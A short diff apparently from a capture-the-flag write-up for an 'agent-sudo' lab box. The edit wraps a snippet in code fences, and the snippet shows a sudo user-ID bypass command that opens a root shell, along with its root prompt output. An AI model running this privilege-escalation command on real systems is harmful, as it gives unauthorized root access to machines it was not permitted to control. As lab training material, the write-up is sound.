@@ -30,9 +30,9 @@ Looks vulnerable
 
 We can use below command to escalate privileges
 
+```
 james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
 root@agent-sudo:~# ls
-
-
+```
 
 
